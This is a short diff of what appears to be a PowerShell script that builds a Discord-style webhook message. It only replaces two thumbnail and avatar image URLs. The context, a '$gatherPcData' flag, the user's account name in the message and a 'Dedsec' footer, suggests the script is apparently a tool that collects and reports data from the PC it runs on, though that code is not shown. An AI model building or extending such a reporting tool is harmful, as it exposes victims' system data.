@@ -207,7 +207,7 @@ $json = @{
                 text = "Dedsec has given you the truth. Do what you will."
             }
             thumbnail = @{
-                url = "https://r2.e-z.host/4d0a0bea-60f8-44d6-9e74-3032a64a9f32/qk5c358p.png"
+                url = "https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExdnhrbHVsbms5ZjVqdmtld2loNGJkYTJyaXhoZGpuY3F2aXVteGIzYyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/aRbUQzyFeSqfn0S6eR/giphy.gif"
             }
         }
         if ($gatherPcData) {
@@ -277,7 +277,7 @@ $json = @{
         }
     )
     username = "$env:USERNAME :3"
-    avatar_url = "https://r2.e-z.host/4d0a0bea-60f8-44d6-9e74-3032a64a9f32/hjz7cham.png"
+    avatar_url = "https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExdnhrbHVsbms5ZjVqdmtld2loNGJkYTJyaXhoZGpuY3F2aXVteGIzYyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/aRbUQzyFeSqfn0S6eR/giphy.gif"
     attachments = @()
 } | ConvertTo-Json -Depth 4
 
